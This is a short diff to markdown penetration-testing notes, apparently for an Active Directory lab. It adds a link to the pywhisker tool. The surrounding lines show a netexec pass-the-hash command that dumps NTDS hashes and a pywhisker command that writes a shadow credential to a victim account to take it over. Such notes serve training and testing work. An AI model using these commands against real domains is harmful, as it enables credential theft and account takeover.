@@ -116,6 +116,8 @@ nxc smb dc -u 'user' -H 'hash' --ntds --user 'Administrator'
 
 In BloodHound, `AddKeyCredentialLink` means a user can write to that attribute and potentially take over the target account.
 
+- https://github.com/ShutdownRepo/pywhisker
+
 ```bash
 # The command below generates an `X.509 certificate` and writes the `public key` to the victim user's `msDS-KeyCredentialLink` attribute
 pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
